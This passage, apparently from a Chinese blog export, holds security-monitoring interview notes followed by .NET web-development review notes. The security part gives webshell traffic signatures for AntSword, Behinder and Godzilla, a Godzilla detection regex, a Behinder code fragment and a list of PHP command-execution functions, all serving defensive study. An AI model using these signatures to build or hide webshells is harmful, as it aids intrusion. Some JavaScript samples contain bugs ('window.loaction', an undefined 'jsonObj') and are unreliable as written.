192.168.1.107</p>\n<p>或者</p>\n<p>ip.addr eq 192.168.1.107 &#x2F;&#x2F; 都能显示来源IP和目标IP</p>\n<p>tcp.port eq 80 &#x2F;&#x2F; 不管端口是来源的还是目标的都显示</p>\n<p>tcp.port &#x3D;&#x3D; 80</p>\n<p>tcp.port eq 2722</p>\n<p>tcp.port eq 80 or udp.port eq 80</p>\n<p>tcp.dstport &#x3D;&#x3D; 80 &#x2F;&#x2F; 只显tcp协议的目标端口80</p>\n<p>tcp.srcport &#x3D;&#x3D; 80 &#x2F;&#x2F; 只显tcp协议的来源端口80</p>\n<p> udp.port eq 15000</p>\n<p> 过滤端口范围</p>\n<p>tcp.port &gt;&#x3D; 1 and tcp.port &lt;&#x3D; 80</p>\n<p>th.dst &#x3D;&#x3D; A0:00:00:04:C5:84 &#x2F;&#x2F; 过滤目标mac</p>\n<p>eth.src eq A0:00:00:04:C5:84 &#x2F;&#x2F; 过滤来源mac</p>\n<p>eth.dst&#x3D;&#x3D;A0:00:00:04:C5:84</p>\n<p>eth.dst&#x3D;&#x3D;A0-00-00-04-C5-84</p>\n<p>eth.addr eq A0:00:00:04:C5:84 &#x2F;&#x2F; 过滤来源MAC和目标MAC都等于A0:00:00:04:C5:84的</p>\n<p>http.request.method &#x3D;&#x3D; “GET”</p>\n<p>http.request.method &#x3D;&#x3D; “POST”</p>\n<p>http.request.uri &#x3D;&#x3D; “&#x2F;img&#x2F;logo-edu.gif”</p>\n<p>http contains “GET”</p>\n<p>http contains “HTTP&#x2F;1.”</p>\n<h3 id=\"shiro反序列化漏洞\"><a href=\"#shiro反序列化漏洞\" class=\"headerlink\" title=\"shiro反序列化漏洞\"></a>shiro反序列化漏洞</h3><p>1.1.3 漏洞原理</p>\n<p>  Apache Shiro框架提供了记住我的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过相关信息进行序列化，然后使用AES加密（对称），最后再使用Base64编码处理。服务端在接收cookie时：</p>\n<p>攻击者可以使用Shiro的默认密钥构造恶意序列化对象进行编码来伪造用户的Cookie，服务端反序列化时触发漏洞，从而执行命令</p>\n<h3 id=\"蚁剑流量特征\"><a href=\"#蚁剑流量特征\" class=\"headerlink\" title=\"蚁剑流量特征\"></a>蚁剑流量特征</h3><p>1.默认的 user-agent 请求头是 antsword xxx（可修改）</p>\n<p> 2.蚁剑的正文内容用URL加密，解密后流量最中明显的特征为ini_set(“display_errors”,”0”);</p>\n<h3 id=\"勒索病毒传播方式有哪些\"><a href=\"#勒索病毒传播方式有哪些\" class=\"headerlink\" title=\"勒索病毒传播方式有哪些\"></a>勒索病毒传播方式有哪些</h3><ul>\n<li>网站挂马：用户浏览挂有木马病毒的网站，上网终端计算机系统极可能被植入木马并感染上勒索病毒。</li>\n<li>邮件传播：攻击者通过利用当前热门字样，在互联网上撒网式发送垃圾邮件、钓鱼邮件，一旦收件人点开带有勒索病毒的链接或附件，勒索病毒就会在计算机后台静默运行，实施勒索。</li>\n<li>漏洞传播：攻击者通过计算机操作系统和应用软件的漏洞攻击并植入病毒，最典型的案例是2017年在国内泛滥的WannaCry大规模勒索事件，攻击者正是利用微软445端口协议漏洞，进行感染传播网内计算机。</li>\n<li>捆绑传播：攻击者将勒索病毒与其他软件尤其是盗版软件、非法破解软件、激活工具进行捆绑，从而诱导用户点击下载安装，并随着宿主文件的捆绑安装进而感染用户的计算机系统。</li>\n<li>介质传播：攻击者通过提前植入或通过交叉使用感染等方式将携有勒索病毒的U盘、光盘等介质进行勒索病毒的移动式传播。</li>\n</ul>\n<h3 id=\"log4j漏洞\"><a href=\"#log4j漏洞\" class=\"headerlink\" title=\"log4j漏洞\"></a>log4j漏洞</h3><p>该漏洞的主要原因是log4j在日志输出中，未对字符合法性进行严格的限制，执行了JNDI协议加载的远程恶意脚本，从而造成RCE</p>\n<h3 id=\"wireshark抓到数据包之后你怎么去分析\"><a href=\"#wireshark抓到数据包之后你怎么去分析\" class=\"headerlink\" title=\"wireshark抓到数据包之后你怎么去分析\"></a>wireshark抓到数据包之后你怎么去分析</h3><h3 id=\"redis-mongodb端口号\"><a href=\"#redis-mongodb端口号\" class=\"headerlink\" title=\"redis mongodb端口号\"></a>redis mongodb端口号</h3><p>redis 6379   </p>\n<p>mongoDB 27017</p>\n<h3 id=\"天眼探针有什么功能\"><a href=\"#天眼探针有什么功能\" class=\"headerlink\" title=\"天眼探针有什么功能\"></a>天眼探针有什么功能</h3><h3 id=\"天眼能否检索网络日志\"><a href=\"#天眼能否检索网络日志\" class=\"headerlink\" title=\"天眼能否检索网络日志\"></a>天眼能否检索网络日志</h3><h3 id=\"struct2命令执行漏洞\"><a href=\"#struct2命令执行漏洞\" class=\"headerlink\" title=\"struct2命令执行漏洞\"></a>struct2命令执行漏洞</h3><p>Struts2的action:、redirect:和redirectAction:前缀参数在实现其功能的过程中使用了Ognl表达式，并将用户通过URL提交的内容拼接入Ognl表达式中，从而造成攻击者可以通过构造恶意URL来执行任意Java代码，进而可执行任意命令</p>\n<h3 id=\"如果目的端口为-x-X-x-x-操作系统win7或者win8，检索语句要怎么写\"><a href=\"#如果目的端口为-x-X-x-x-操作系统win7或者win8，检索语句要怎么写\" class=\"headerlink\" title=\"如果目的端口为: x.X.x.x,操作系统win7或者win8，检索语句要怎么写\"></a>如果目的端口为: x.X.x.x,操作系统win7或者win8，检索语句要怎么写</h3><h3 id=\"怎么写模糊查询告警类型为写入文件的检索语句\"><a href=\"#怎么写模糊查询告警类型为写入文件的检索语句\" class=\"headerlink\" title=\"怎么写模糊查询告警类型为写入文件的检索语句\"></a>怎么写模糊查询告警类型为写入文件的检索语句</h3><h3 id=\"如果出现两条相同的sql注入告警你会怎么处理\"><a href=\"#如果出现两条相同的sql注入告警你会怎么处理\" class=\"headerlink\" title=\"如果出现两条相同的sql注入告警你会怎么处理\"></a>如果出现两条相同的sql注入告警你会怎么处理</h3><h3 id=\"如果出现蠕虫病毒告警，如何处理\"><a href=\"#如果出现蠕虫病毒告警，如何处理\" class=\"headerlink\" title=\"如果出现蠕虫病毒告警，如何处理\"></a>如果出现蠕虫病毒告警，如何处理</h3><h3 id=\"php命令执行函数\"><a href=\"#php命令执行函数\" class=\"headerlink\" title=\"php命令执行函数\"></a>php命令执行函数</h3><p><strong>system()，passthru()，exec()，pcntl_exec()，shell_exec()，popen()&#x2F;proc_popen()，反引号 &#96;&#96;</strong></p>\n<h3 id=\"冰蝎流量特征\"><a href=\"#冰蝎流量特征\" class=\"headerlink\" title=\"冰蝎流量特征\"></a>冰蝎流量特征</h3><p>Accept: application&#x2F;json, text&#x2F;javascript, <em>&#x2F;</em>; q&#x3D;0.01</p>\n<p>Content-type: Application&#x2F;x-www-form-urlencoded</p>\n<p>冰蝎设置了10种User-Agent,每次连接shell时会随机选择一个进行使用。</p>\n<p>冰蝎与webshell建立连接的同时，javaw也与目的主机建立tcp连接，每次连接使用本地端口在49700左右，每连接一次，每建立一次新的连接，端口就依次增加。</p>\n<p>$post&#x3D;Decrypt(file_get_contents(“php:&#x2F;&#x2F;input”));</p>\n<h3 id=\"哥斯拉流量特征\"><a href=\"#哥斯拉流量特征\" class=\"headerlink\" title=\"哥斯拉流量特征\"></a>哥斯拉流量特征</h3><p>Accept为text&#x2F;html, image&#x2F;gif, image&#x2F;jpeg, *; q&#x3D;.2, <em>&#x2F;</em>; q&#x3D;.2</p>\n<p>cookie中分号结尾</p>\n<p>和请求体一样，请求响应体也分两个格式，base64编码的和原始加密raw数据。如果请求体采用base64编码，响应体返回的也是base64编码的数据。在使用base64编码时，响应体会出现一个很明显的固定特征。这个特征是客户端和服务端编写的时候引入的。</p>\n<p>从代码可以看到会把一个32位的md5字符串按照一半拆分，分别放在base64编码的数据的前后两部分。整个响应包的结构体征为：md5前十六位+base64+md5后十六位。<br>从响应数据包可以明显看到这个特征，检测时匹配这个特征可以达到比较高的检出率，同时也只可以结合前面的一些弱特征进行检查，进一步提高检出率。因为md5的字符集范围在只落在0123456789ABCDEF范围内，因此很容易去匹配，正则匹配类似于(?i:[0-9A-F]{16})[\\w+&#x2F;]{4,}&#x3D;?&#x3D;?(?i:[0-9A-F]{16})。需要注意的是md5需要同时匹配字母大小写两种情况，因为在JAVA版webshell响应中为大写字母，在PHP版中为小写字母。</p>\n<h3 id=\"发现有入侵攻击，查看主机的哪些日志\"><a href=\"#发现有入侵攻击，查看主机的哪些日志\" class=\"headerlink\" title=\"发现有入侵攻击，查看主机的哪些日志\"></a>发现有入侵攻击，查看主机的哪些日志</h3><p>&#x2F;var&#x2F;log&#x2F;</p>\n<h3 id=\"如何防范反序列化漏洞\"><a href=\"#如何防范反序列化漏洞\" class=\"headerlink\" title=\"如何防范反序列化漏洞\"></a>如何防范反序列化漏洞</h3><p>防范反序列化漏洞的方法主要包括以下几点：</p>\n<ol>\n<li>输入过滤：在接收用户输入时，进行有效性验证和输入过滤，避免恶意输入。</li>\n<li>对象序列化前加密：对即将进行序列化的对象中的敏感数据或者方法进行加密处理，避免序列化后数据被篡改。</li>\n<li>签名校验：利用数字签名技术，在序列化和反序列化的过程中添加签名机制，校验序列化对象是否经过篡改。</li>\n<li>更新库文件：定期更新使用的序列化库文件，避免因为库文件中的漏洞而导致反序列化漏洞的产生。</li>\n<li>减少依赖第三方类库：减少依赖第三方类库的情况，避免由于第三方类库中的漏洞而导致反序列化漏洞的产生。</li>\n<li>最小化序列化：精简序列化对象中的属性，避免不必要的属性被序列化，从而降低反序列化的风险。</li>\n</ol>\n<p>以上是防范反序列化漏洞的一些基本方案。此外，如果使用的是Java语言，还可以通过Java Security Manager来控制反序列化操作的权限。在开发项目时，应该尽可能地避免使用Java反序列化操作，或者在进行序列化和反序列化操作时，更加谨慎的写好对应的代码和相关配置。</p>\n<h3 id=\"天眼上显示多个不同url的SQL注入告警，可能是什么原因？\"><a href=\"#天眼上显示多个不同url的SQL注入告警，可能是什么原因？\" class=\"headerlink\" title=\"天眼上显示多个不同url的SQL注入告警，可能是什么原因？\"></a>天眼上显示多个不同url的SQL注入告警，可能是什么原因？</h3><p>可能是网站存在多个不同的漏洞点，或者攻击者利用了不同的注入方式和参数来尝试注入，导致出现多个不同的SQL注入告警。此外，也有可能是天眼扫描器在扫描过程中出现了误报或者漏报情况，需要对告警进行仔细分析和验证。建议及时修复漏洞点，防范SQL注入等安全威胁。</p>\n<h3 id=\"我们在天眼上遇到文件上传告警时，应急响应的流程是怎样的？-同一台资产多次发出同一个告警，可能的原因？\"><a href=\"#我们在天眼上遇到文件上传告警时，应急响应的流程是怎样的？-同一台资产多次发出同一个告警，可能的原因？\" class=\"headerlink\" title=\"我们在天眼上遇到文件上传告警时，应急响应的流程是怎样的？ 同一台资产多次发出同一个告警，可能的原因？\"></a>我们在天眼上遇到文件上传告警时，应急响应的流程是怎样的？ 同一台资产多次发出同一个告警，可能的原因？</h3><p>应对文件上传告警的应急响应流程一般包括如下步骤：</p>\n<ol>\n<li>确认告警情况：查看告警详细信息，包括文件类型、大小、上传时间、上传者、上传路径、上传方式、来源IP等，判断是否存在风险。</li>\n<li>暂停上传功能：对于存在风险的上传功能，需要暂停上传功能，防止攻击者持续上传。</li>\n<li>验证漏洞点：对上传功能进行全面测试，确认漏洞点，包括上传参数的类型、限制、验证等。</li>\n<li>修复漏洞点：根据漏洞点的验证结果，提供相应的解决方案和实施措施，比如对上传文件进行类型、大小、扩展名、后缀名等多个方面的限制。</li>\n<li>监测告警情况：在上传功能修复后，需对文件上传行为进行全面监测，查看是否仍然存在风险。</li>\n</ol>\n<p>同一台资产多次发出同一个告警可能是以下原因：</p>\n<ol>\n<li>真实存在的漏洞：同一漏洞点被攻击者利用多次，导致多次告警。</li>\n<li>系统误报：扫描器或监测设备存在误报，由于告警下发频繁，导致同一漏洞多次告警。</li>\n<li>前置设备异常：网络设备、WAF等前置设备异常，导致同一个请求被多次拦截，产生多次告警。</li>\n</ol>\n<p>在排查告警原因时，需要进行仔细分析和判断，以确认是否存在真实风险。需要及时对真实漏洞进行修复和防范，对于误报和异常情况则需要针对性的进行排查和修复。</p>\n<h3 id=\"linux临时文件位置\"><a href=\"#linux临时文件位置\" class=\"headerlink\" title=\"linux临时文件位置\"></a>linux临时文件位置</h3><p>在Linux系统中，临时文件通常放置在以下几个目录中：</p>\n<ol>\n<li>&#x2F;tmp目录：该目录是Linux系统中最常用的临时文件目录之一，任意用户都可以在该目录中创建、修改、删除文件。该目录下的文件在系统重启后会被清空。</li>\n<li>&#x2F;var&#x2F;tmp目录：该目录和&#x2F;tmp目录类似，不同之处在于该目录下的文件在系统重启后不会被清空，需要手动删除。</li>\n<li>&#x2F;dev&#x2F;shm目录：该目录是一个ramfs文件系统，在内存中创建一个文件系统，并且把该文件系统挂载到&#x2F;dev&#x2F;shm目录下。该目录也可以作为临时文件目录使用，因为文件在内存中创建，所以读写速度较快。</li>\n</ol>\n<p>除了上述目录之外，还有一些应用程序会自己创建临时文件目录，例如Apache创建的临时文件夹为&#x2F;var&#x2F;cache&#x2F;httpd，Nginx创建的临时文件目录为&#x2F;var&#x2F;run&#x2F;nginx&#x2F;client_body_temp。</p>\n<p>需要注意的是，在使用临时文件时，应尽可能使用系统默认的临时文件目录，避免用在不安全或者没有权限控制的目录。临时文件的权限也应该设置为仅能被创建者和目录管理员使用，并尽可能定期清理，以降低系统安全风险。</p>\n<h3 id=\"使用天眼遇到sql告警怎么处理\"><a href=\"#使用天眼遇到sql告警怎么处理\" class=\"headerlink\" title=\"使用天眼遇到sql告警怎么处理\"></a>使用天眼遇到sql告警怎么处理</h3><p>处理天眼上的SQL告警，一般需要按照以下步骤进行：</p>\n<ol>\n<li>核实告警：对收到的告警首先进行核实，查看告警详情以确认告警是否为真实漏洞。</li>\n<li>定位漏洞：确认告警存在后，需要进行漏洞定位，以查找漏洞原因和具体位置，检查SQL查询参数、输入过滤、数据库配置等方面。</li>\n<li>修复漏洞：根据定位得到的漏洞内容，进行相应的安全加固和漏洞修复，比如优化SQL查询语句、加强输入过滤、修复数据库配置等。</li>\n<li>验证修复结果：在修复漏洞后，需要再次测试系统以验证修复结果，确保系统安全性得到提高。</li>\n<li>预防未来漏洞：在修复漏洞之后，需要对SQL注入漏洞进一步加强防范和监测，避免类似漏洞重演。</li>\n</ol>\n<p>需要注意的是，上述过程应该配合严格的访问控制和身份认证机制，并进行安全审计来保证系统的安全性。另外，如果使用天眼监测到SQL注入漏洞的话，可以结合其他安全工具如WAF来对系统进行进一步防御。通过不断加强安全防护链的研发和落地，能让系统安全得到有力地提升。</p>\n"},{"title":".NET复习","date":"2023-03-12T15:27:39.000Z","excerpt":".NET复习","_content":"\n# NET\n\n# 一.前端部分\n\n## 1.VScode 常用插件\n\n- `Live Server` **搭建具有实时加载功能的小型服务器**\n- `Open-In-Browser`**直接在浏览器中查看页面**\n- `HTML CSS Support`**HTML和CSS代码提示**\n- `CSS Peak`**追踪至样式表中CSS类和id定义的地方**\n- `Prettier-Code formatter`**代码格式化工具**\n- `JavaScript（ES6)CODE SNIPPETS`**支持ES6和JavaScript代码片段插件**\n- `Color Info`**CSS中使用颜色的相关信息**\n\n## \n\n## 2.HTML\n\n#### ◼html部分特殊符号\n\n| 显示结果 | &nbsp  |\n| :------: | :----: |\n|   空格   | &nbsp  |\n|    <     |  &lt   |\n|    >     |  &gt   |\n|    &     |  &amp  |\n|    £     | &pound |\n|    ¥     |  &yen  |\n|    ©     | &copy  |\n|    ®     |  &reg  |\n|    ™     | &trade |\n|    ×     | &times |\n\n#### ◼html表格基本结构\n\n```html\n    <table border=\"1\" width=\"600px\">\n        <caption>学生名单</caption>\n        <tr>\n            <th>学号</th>\n            <th>姓名</th>\n            <th>院系</th>\n            <th colspan=\"2\">操作</th>\n        </tr>\n        <tr>\n            <td>2021001</td>\n            <td>小明</td>\n            <td>计算机学院</td>\n            <td>编辑</td>\n            <td>删除</td>\n        </tr>\n    </table>\n```\n\n- 每个`tr`表示一行每个`th`代表这一行中的每个元素值（第一行）`td`代表这一行中的每个元素值(非第一行)\n- `colspan=3`表示这个一次包含3纵列\n- `rowspan=4`表示这个一次包含4行\n\n\n\n#### ◼form表单基本结构\n\n```html\n<form action=\"data.html\" method=\"get\">\n        用户名：<input type=\"text\" name=\"nusername\"\n        <br>\n        密码：<input type=\"password\" name=\"pwd\"><br/>\n        <input type=\"submit\" value=\"提交\"<br/>\n        <input type=\"reset\" value=\"重填\"\n</form>\n```\n\n- `http://127.0.0.1:5500/data.html?nusername=123&pwd=456`这里将值传入了data.html，值与值之间用**<u>&</u>**隔开\n- `action=xxxx.xxxx`表示将这分表单的数据传入**xxxx.xxxx**\n- `methon='get'`表示传入方法是`get`方法，同理还有`post`方法\n\n\n\n#### ◼一些form表单元素及其属性作用\n\n```html\n<form>\n        用户名：\n        <input type=\"text\" name=\"username\" value=\"liulei\" title=\"提示信息\"\n        <br/>\n        密码：\n        <input type=\"password\" name=\"pwd\" maxlength=\"8\" placeholder=\"长度8个字符\"\n</form>\n```\n\n- `name=\"username\"`表示将数据提交时url显示的参数名字是**username**\n- `value=liulei` 属性的值表示的是`输入框中显示的初始值`\n- `title=提示信息`鼠标移上去后会弹出“**<u>提示信息</u>**”\n- `maxlength=8`最大位数是8\n- `placeholder=\"长度8个字符\"`当没有输入时显示“**<u>长度8个字符</u>**”\n\n\n\n\n\n```html\n    <form>\n        专业特长：<br/>\n        <select name=\"master\" size=\"4\" multiple=\"multiple\">\n            <option value=\"0\">.NET</option>\n            <option value=\"1\">J2EE</option>\n            <option value=\"2\">Java</option>\n            <option value=\"3\">Android</option>\n            <option value=\"4\">C</option>\n        </select>\n    </form>\n```\n\n- `size` 属性规定下拉列表中可见选项的数目\n- `multiple=\"multiple\"`表示可以同时选择多个选项\n- `value`属性如果我们选择的是**JAVA**那么我传入的数据就是**master=2**\n\n\n\n```html\n<form >\n附件：<input type=\"file\" name=\"myfile\" accept=\"文件类型\">\n</form>\n```\n\n![图片](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151450148.png)\n\n\n\n\n\n```html\n<form>\n\t<input type=\"date\" name=\"mydate\">\n</form>\n```\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151450996.png)\n\n\n\n## 3.css\n\n#### ◼ CSS的一些单位\n\n![图片-1667485429884](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151451939.png)\n\n#### ◼常见选择器及优先级\n\n| 选择器                     | 10000 |\n| -------------------------- | ----- |\n| style（内联样式）          | 1000  |\n| id选择器                   | 100   |\n| 类选择器、属性选择器、伪类 | 10    |\n| 标签选择题、伪元素         | 1     |\n| 通配符                     | 0     |\n\n**一般来说：选择范围较大的级别较低**\n\n#### ◼CSS 的 2 个示例\n\n\n\n##### 1.悬浮变色、边框、阴影等效果\n\n```css\ndiv{\n\tbackground-color:lightgrey;\n\twidth:130px;\n\tborder-left:20px solid green /*做边框*/\n\tborder-radius:5px;/*圆角*/\n\tpadding:10px;\n\tmargin:30px;\n}\ndiv:hover{\n\tbackground-color:rgb(151,248,39);\n\tcursor:pointer;\n\tbox-shadow:3px 3px 5px 1px rgba(0,0,0.2);/*阴影*/\n}\n<div>武汉科技大学</div>\n```\n\n- `background-color`属性设置元素的背景颜色\n- `width`设置段落宽度\n- `border-left`设置左边框属性\n- `border-radius`添加圆角边框\n- `padding`内边距\n- `margin`外边距\n- `hover`选择鼠标指针浮动在其上的元素，并设置其样式\n- `cursor:pointer`网页浏览时用户鼠标指针的样式或图形形状为一只伸出食指的手\n- `box-shadow` 属性用于在元素的框架上添加阴影效果（ X 轴偏移量、Y 轴偏移量、模糊半径、扩散半径和颜色）\n\n\n\n##### 2.简单导航\n\n```html\n<ul class=\"nav\">\n\t<li><a href=\"#home\">主页</a></li>\n\t<li><a href=\"#news\">新闻</a></li>\n\t<li><a href=\"#contact\">联系</a></li>\n\t<li><a href=\"#about\">关于</a></li>\n</ul>\n```\n\n\n\n```css\nul.nav {\n\tlist-style-type: none;\n}\n.nav li {\n\tfloat: left;\n}\n.nav li a:link,\n.nav li a:visited {\n        display: block;\n        width: 120px;\n        text-align: center;\n        padding: 4px;\n        color: #fff;\n        background-color: #98bf21;\n        text-decoration: none;\n}\n.nav li a:hover,\n.nav li a:active {\n    background-color: #7a991a;\n}\n```\n\n- `float:left`把图像像左浮动\n- `list-style-type`设置列表样式类型\n- `a:link`正常，未访问过的链接\n- `a:visited`用户已访问过的链接\n- `display:block`设置为块级元素\n- `text-align`设置文本对齐方式\n- `text-decoration`文本修饰\n\n## 4.JavaScript\n\n\n\n#### ◼ js基本特点\n\n- JS是一种**<u>解释性脚本语言</u>**（代码不进行预编译，可在程序运行过程中逐行进行解释）\n- JS是一种**<u>简单的弱类型脚本语</u>**言（未使用严格的数据类型\n- JS是一种**<u>基于对象的语言</u>**（不仅可以创建对象，也能使用自身的对象或其他语言创建的对象）\n- JS是一种**<u>跨平台脚本语言</u>**（不依赖于操作系统，仅需要浏览器的支持）\n\n#### ◼JS箭头函数\n\n**匿名函数可进一步用箭头函数来简化（箭头函数用`=>`定义，也成：lambda表达式**\n\n```js\nlet foo=function(num){\n    return num+1;\n}\nlet a=foo(100);\n\n//使用箭头函数\n\nlet foo =(num)=>num+1;\n```\n\n **JS 数组操作：map、reduce、join、slice、splice、push、pop、shift、unshift 方法基本用法**\n\n\n\n**JS 程序：五秒倒计时，跳转到学校官网**\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Document</title>\n</head>\n<body>\n    <button id=\"ok\">3秒后确定</button>\n</body>\n</html>\n<script>\n    let btn=document.getElementById(\"ok\");\n    btn.disabled=true;\n    let t=3;\n    function count(){\n        t--;\n        btn.innerHTML=t+\"秒后确定\";\n        if(t<=0){\n            clearInterval(id);\n            btn.disabled=false;\n            btn.innerHTML=\"确定\";\n            let url=window.location;\n            window.loaction=\"https://www.wust.edu.cn\"\n        }\n    }\n    let id = setInterval(count,1000);\n</script>\n```\n\n- `document.getElementById`方法可返回对拥有指定 ID 的第一个对象的引用\n- `btn.disabled`禁用\n- `btn.innerHTML` 属性设置或返回表格行的开始和结束标签之间的 HTML。\n- `setInterval`方法可按照指定的周期（以毫秒计）来调用函数或计算表达式\n- `clearInterval`方法可取消由 setInterval() 函数设定的定时执行操作\n- `window.loaction`页面跳转\n\n#### ◼DOM基本概念\n\n**DOM:文档对象模型**\n\n**DOM是载入到浏览器中的文档模型，以节点树的形式来表现文档，每个节点代表文档的构成部分**\n\n\n\n#### ◼DOM常用操作\n\n##### 1.查询操作\n\n```html\n<ul id=\"list\">\n<li class=\"item\">1</li>\n<li class=\"item\">2</li>\n<li class=\"item\">3</li>\n</ul>\n```\n\n```js\nlet list = document.getElementById('list') // 命中id=\"list\"的元素，注意不带#，不是css选择器\nconsole.log(list.innerHTML) //查看元素的HTML内容\nlet first = document.querySelector('.item') // 命中第一个 class=\"item\" 参数为class选择器\nconsole.log(first.innerHTML)\nlet second = document.querySelector('.item:nth-child(2)') // 命中第二个 .item 复杂的css选择器\nconsole.log(second.innerHTML)\nlet items = document.querySelectorAll('.item') // 获得包含所有 .item 的集合（NodeList）\nconsole.log(items.length) //查看集合长度\nfor ( let el of items ) { //遍历集合\nconsole.log(el)\n}\n```\n\n##### 2.创建操作：document.createElement\n\n```html\n<ul id=\"list\">\n<li class=\"item\">1</li>\n<li class=\"item\">2</li>\n<li class=\"item\">3</li>\n</ul>\n```\n\n```js\nlet list = document.createElement('ul') //创建1个ul元素\nlist.id = 'list' // 设置元素的id属性\nfor ( let i = 0; i < 3; i++ ) {\nlet item = document.createElement('li') //循环创建3个li元素\nitem.className = 'item' // 设置元素的class属性\nitem.innerText = `${i + 1}` // 设置元素的innerText属性 (使用了模板字符串)\nlist.appendChild(item) // 将创建好的元素添加到父节点\n}\n// 将list添加到body\ndocument.body.appendChild(list)\n```\n\n#### JSON对象定义基本特点\n\n- **<u>数据在键值对中（键名即属性名必须加双引号）</u>**\n- **<u>数据由逗号分隔</u>**\n- **<u>花括号保存对象</u>**\n- **<u>方括号保存数组</u>**\n\n**JSON可通过JavaScript进行解析，JSON的值可以是：数字 字符串 逻辑值 数组 对象 null**\n\n**json不能存储Date对象，如果需要则用字符串表示**\n\n\n\n#### JSON.parse程序示例：\n\n**◼ JSON.parse(text [, reviver]) ：将JSON格式字符串转换为JavaScript对象**\n\n**◼ 参数说明：**\n\n- `text`：必需，一个有效的JSON字符串 (如格式不正确则解析会出错)\n- `reviver`：可选，一个转换结果的函数， 将为对象的每个成员调用此函数\n\n```js\nlet jstr = '{\"name\":\"wust\", \"url\":\"www.wust.edu.cn\",\"birthday\":\"1898-11-21\"}';\nlet obj = JSON.parse( jstr, function(key, value) {\n\tif (key == \"birthday\") {\n\t\tlet diff = new Date() - new Date(value); //计算距今的毫秒数\n\t\tlet year = parseInt(diff / 1000 / 60 / 60 / 24 / 365); //相差的年数\n\t\treturn year;\n\t}else{\n        return value;\n    }\n})\nconsole.log(jsonObj.birthday);\n```\n\n# 二.MVC后台部分\n\n#### 1.MVC基本概念：\n\n- MVC:是一种体系结构模式，他将应用程序分成3个主要组件：**<u>模型（Model）视图（View）和控制器（Controller）</u>**\n- MVC模式有助于实现关注点分离：\n- 关注点：**输入逻辑** **业务逻辑** **UI逻辑**\n\n#### 2.MVC三个模块功能\n\n- 控制器C：处理浏览器的请求，决定如何调用业务层数据的增、删、改、查等业务操作，以及如何将结果返回给视图进行渲染。\n- 模型M：应用的实体类，用于在内存中暂时存储数据，并在数据变化时通知控制器。\n- 视图V：主要用来解析、处理、显示内容，并进行模板的渲染。\n\n#### 3.MVC体系结构优点：\n\n◼ Controller与View完全分离(松耦合)，有利于前、后台分工合作\n\n◼ 一个Model可建立多个视图，满足用户不同需求\n\n◼ Model独立于视图，可移植到新的平台，代码重用高，易于维护\n\n◼ 表现层的性能可以优化到极致\n\n◼ 容易对界面逻辑进行单元测试\n\n◼ 非常强大的URL映射组件，非常干净的URL来建造应用\n\n◼ 有利于软件工程化管理\n\n#### 4.MVC项目目录结构\n\n![图片-1667485456621](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151451438.png)\n\n#### 5.Razor基本概念和基本语法规则\n\n`Razor概念`Razor是一个视图模板引擎，它提供了优雅的方法将基于服务器的代码（如C#）嵌入到HTML页面中\n\n`Razor语法规则`\n\n◼ C# 代码封装于 @{ ... } 中\n\n◼ 代码语句以分号结尾\n\n◼ 行内表达式（变量和函数）以 @ 开头\n\n◼ C# 代码对大小写敏感\n\n#### 6.ViewData传值特点\n\n- ViewData是一个字典对象，用来从Controller向对应的View视图传值\n- ViewData只在当前请求中有效，生命周期和View相同，其值不能在多个请求中共享\n- 在重定向(新请求)后，ViewData存储的值将变为null\n- 使用ViewData值时必须进行合适的类型转换和建议空值检查\n\n#### 7.TrmpData传值特点\n\n- TempData也是一个字典对象，但是基于Session存储机制\n- TempData用在多个Action间或页面重定向(Redirection)时传递共享数据\n- 但TempData存放的数据只一次访问中有效，一次访问完成后就会删除\n- TempData用法和ViewData相同\n\n#### 8.“新搭建基架的项目”时生成的一些内容：\n\n![图片-1667485469907](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151451623.png)\n\n#### 9.EF Core数据库迁移两个命令：\n\n① **<u>Add-Migration InitialCreate</u>**\n\n② **<u>Uppate-Database</u>**\n\n#### 10.ORM的概念\n\n> ORM (Object Relation Mapping) 是对象/关系映射，它将内存中的对象和数据库中的立映射关系\n\n#### 11.ORM技术产生的背景原因\n\n◼ 面向对象开发方法是当今企业级应用主流开发方法。\n\n◼ 关系数据库是企业级应用永久存放数据的主流数据存储系统。\n\n◼ 对象和关系数据是业务实体两种表现形式：业务实体在内存中表现为对象(非持久化存储)，在数据库中表\n\n现为关系数据(持久化存储) 。\n\n◼ 需要一种技术实现二者间映射，以简化编程，提高系统效率 \n\n#### 12.模型的一些DateType注解\n\n|     DataType类型值      |       说明       |\n| :---------------------: | :--------------: |\n|    DataType.Currency    |    表示货币值    |\n|      DataType.Date      |    表示日期值    |\n|  DataType.EmailAddress  | 表示电子邮件地址 |\n| DataType.Multiline Text |   表示多行文本   |\n|    DataType.Password    |    表示密码值    |\n|      DataType.Time      |    表示时间值    |\n|      DataType.Url       |  表示一个URL值   |\n\n#### 13.模型的一些验证注解\n\n◼ `[Required]`：验证字段是否不为 null\n\n◼ `[StringLength]`：验证字符串属性值是否不超过指定的长度限制。\n\n◼ `[Range]`：验证属性值是否位于指定范围内。\n\n◼ `[Compare]`：验证模型中的两个属性是否匹配。\n\n◼ `[RegularExpression]`：验证 属性值是否与指定的正则表达式匹配。\n\n◼ `[EmailAddress]`：验证属性是否具有电子邮件格式。\n\n注：`[DataType]`：只是帮助字段进行格式设置，不提供任何验证\n\n#### 14.控制器方法的两个注解\n\n◼ `[HttpPost] 注解：`表明只能由POST请求才能调用此Action方法，不写默认[HttpGet] (第一个Create就是GET)\n\n◼ `[ValidateAntiForgeryToken] 注解：`用于防止请求伪造 (更安全)\n\n#### 15.强类型传值\n\n◼ 回顾：ViewData字典传值是一个弱类型传值方式 (使用时需要手工强转类型)\n\n◼ 强类型传值则不需要手工强转类型\n\n◼ 如何实现强类型传值：\n\n\t\t① 控制器在返回视图时，添加模型对象作为参数，即： return View(模型对象); \n\t\n\t\t② 在视图中，先使用 @model 指令声明模型对象类型\n\t\n\t\t③ 然后在视图中使用Model对象来接收传来的模型对象，之后使用Model对象无需强转\n\n#### 